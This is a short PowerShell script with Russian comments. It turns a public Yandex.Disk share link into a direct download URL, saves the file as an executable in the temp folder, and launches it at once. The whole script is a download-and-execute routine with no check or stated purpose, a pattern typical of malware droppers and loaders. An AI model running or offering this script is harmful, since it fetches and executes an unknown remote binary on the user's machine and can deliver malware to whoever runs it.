# Публичная ссылка на файл на Яндекс.Диске
$publicUrl = "https://disk.yandex.ru/d/aKmufr351xu1hw"

# Получаем прямую ссылку на скачивание через API
$apiUrl = "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key=$([uri]::EscapeDataString($publicUrl))"

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
    $downloadUrl = $response.href

    if (-not $downloadUrl) {
        throw "Прямая ссылка не получена"
    }

    # Путь для сохранения временного файла
    $tempFile = "$env:TEMP\yadisk_temp.exe"

    Write-Host "`n[!] Скачиваю файл..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile

    Write-Host "[+] Файл сохранён: $tempFile"
    Write-Host "[*] Запускаю файл..." -ForegroundColor Green

    Start-Process -FilePath $tempFile -Wait
}
catch {
    Write-Error "Ошибка при скачивании или запуске: $_"
}
